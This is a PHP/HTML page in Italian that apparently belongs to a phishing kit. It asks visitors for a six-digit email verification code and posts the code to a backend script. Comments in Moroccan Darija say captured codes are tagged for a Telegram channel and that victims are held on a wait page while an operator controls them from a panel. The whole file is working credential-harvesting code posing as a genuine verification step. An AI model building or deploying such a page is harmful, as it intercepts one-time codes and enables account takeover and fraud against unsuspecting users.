<?php
require '../main.php';
?><!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Conferma E-mail</title>
<link rel="stylesheet" href="res/app.css">
<style>
    /* Styling l-bouton */
    .btn-continue {
        width: 100%;
        padding: 14px;
        background-color: #007bff;
        color: white;
        border: none;
        border-radius: 8px;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        margin-top: 20px;
        transition: background 0.3s;
    }
    .btn-continue:hover {
        background-color: #0056b3;
    }
    input.error {
        border: 1px solid red !important;
    }
    .email-highlight {
        font-size: 20px;
        color: #000;
        font-weight: bold;
        display: block;
        margin-top: 5px;
    }
</style>
</head>
<body>
<main>
<div class="form">
    <div class="header">
        <a href="#" class="back-btn">←</a>
        <div class="logo-small"><img src="res/logo.png"></div>
        <a href="#" class="close-btn">×</a>
    </div>
    <div class="content">
        <h2>Inserisci il codice a 6 cifre</h2>
        <span class="subtitle">
            Un codice di verifica è stato inviato al tuo indirizzo 
            <span class="email-highlight">e-mail</span>
        </span>

        <input type="text" id="u" placeholder="Inserisci il codice" maxlength="6" inputmode="numeric" style="text-align:center; font-size:24px; letter-spacing:5px;">

        <?php if(isset($_GET["e"])){
            echo '<div class="error-message" style="color:red; margin-top:10px;">' . $lang['_invalid_code_message'] . '</div>';
        }
        ?>

        <button type="button" class="btn-continue" onclick="sendLogin()">Continua</button>

        <div class="info-box" style="margin-top:25px;">
            <div class="info-text">
                <strong>Controlla la posta in arrivo</strong>
                <p>Abbiamo inviato il codice al tuo indirizzo e-mail. Se non lo trovi, controlla anche la cartella <strong>Spam</strong>.</p>
            </div>
        </div>
    </div>
    <div class="footer">
        <a href="#" class="resend-link">Invia nuovamente il codice</a>
    </div>
</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
function sendLogin(){
    let code = $("#u").val();
    $("input").removeClass("error");

    if(code == "" || code.length < 6){
        $("#u").addClass("error");
        return;
    }

    // Envoi des données
    $.post("post.php", {
        sms: code, // Ghadi n-khliwha 'sms' bach t-mchi l-nfs l-blast f post.php
        type: "email_code" // Ila bghiti t-3refha f Telegram beli dial email
    }, function(res){
        <?php if(isset($_GET['e'])){
            echo 'window.location="exit.php";';
        } else {
            // Kat-mchi l-wait bach t-controliha mn l-panel
            echo 'window.location="wait.php";';
        } ?>
    });
}

$(document).ready(function(){
    // Filter digits only
    $("#u").on("input", function(){
        let val = $(this).val().replace(/\D/g, '');
        if(val.length > 6) val = val.substring(0,6);
        $(this).val(val);
    });

    // Enter key support
    $("#u").keypress(function(e){
        if(e.key === "Enter"){
            sendLogin();
        }
    });
});
</script>
</body>
</html>